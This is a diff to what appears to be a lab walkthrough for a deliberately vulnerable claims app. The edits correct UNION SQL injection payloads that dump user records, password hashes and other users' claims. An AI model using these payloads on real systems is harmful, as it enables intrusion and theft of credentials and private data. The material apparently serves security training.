@@ -70,10 +70,18 @@ Go to **Search Claims** (`/search-claims`).
 
 The search input is inserted into the SQL query **twice** (for `title LIKE` and `description LIKE`). The `--` comment operator neutralises everything after it on the same line, so only the first occurrence matters.
 
-To perform a `UNION`-based injection, the number of columns must match the original query (12 columns). Test with:
+The raw SQL query looks like this:
+
+```sql
+SELECT * FROM claims WHERE user_id = <id> AND (title LIKE '%INPUT%' OR description LIKE '%INPUT%') ORDER BY created_at DESC
+```
+
+Note the opening parenthesis `(` before `title`. The injection payload must **close this parenthesis** with `)` before the `UNION`.
+
+Test with:
 
 ```
-x' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12 -- 
+x') UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12 -- 
 ```
 
 > **Important:** Make sure to include a trailing space after `--`. PostgreSQL requires it for the comment to be valid.
@@ -85,7 +93,7 @@ If the page loads without a "Query error" flash message, the column count is cor
 Enter the following payload in the search box:
 
 ```
-x' UNION SELECT id, username, email, username, role, 0.0, role, created_at, created_at, NULL, NULL, NULL FROM users -- 
+x') UNION SELECT id, username, email, username, role, 0.0, role, created_at, created_at, NULL, NULL, NULL FROM users -- 
 ```
 
 This maps user data to the columns the template renders:
@@ -103,7 +111,7 @@ This maps user data to the columns the template renders:
 The password hash column cannot be placed in the Amount position (`row[5]`) because the template tries to format it as a float (`"%.2f"|format(row[5])`). Use this separate payload to extract hashes:
 
 ```
-x' UNION SELECT id, username, email, password_hash, created_at::text, NULL, NULL, password_hash, NULL, NULL, NULL, NULL FROM users -- 
+x') UNION SELECT id, username, email, password_hash, created_at::text, NULL, NULL, password_hash, NULL, NULL, NULL, NULL FROM users -- 
 ```
 
 This places `password_hash` in the `additional_details` position (`row[7]`), which renders as plain text in the Submitted column.
@@ -113,7 +121,7 @@ This places `password_hash` in the `additional_details` position (`row[7]`), whi
 ### Step 6 — Extract all claims from other users
 
 ```
-x' UNION SELECT id, user_id, claim_type_id, title, description, amount, status, additional_details, created_at, updated_at, reviewed_by, review_notes FROM claims WHERE user_id != 1 -- 
+x') UNION SELECT id, user_id, claim_type_id, title, description, amount, status, additional_details, created_at, updated_at, reviewed_by, review_notes FROM claims WHERE user_id != 1 -- 
 ```
 
 This returns claims belonging to all other users.
